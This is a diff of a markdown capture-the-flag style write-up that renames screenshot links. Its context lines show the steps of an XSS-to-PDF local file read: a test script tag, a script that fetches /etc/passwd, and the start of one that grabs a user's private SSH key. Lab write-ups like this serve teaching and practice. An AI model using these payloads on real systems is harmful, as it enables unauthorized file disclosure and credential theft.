@@ -75,9 +75,9 @@ admin                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration:
 #### Initial Foothold 
 - on the regular user dashboard under the collections tab there a book submission functionality which we can use to test for any input injection vulnerabilities
 - we can test for XSS `<script>document.write("hello world")</script>`
-![[Pasted image 20250821231540.png]]
+![[payload_book_submission.png]]
 - go to collections on the admin side, click on PDF and open the PDF, the message which the script has been loaded into the PDF, which means that the form is vulnerable to `XSS`
-![[Pasted image 20250821231807.png]]
+![[test_xss.png]]
 - we can use `XSS` to get access to files on the target, use below to get `/etc/passwd`
 ```
 <script>
@@ -89,7 +89,7 @@ document.write(x.responseText);
 x.send();
 </script>
 ```
-![[Pasted image 20250821232029.png]]
+![[xss_passwd.png]]
 - we can get the private ssh key of `reader` user
 ```
 <script>
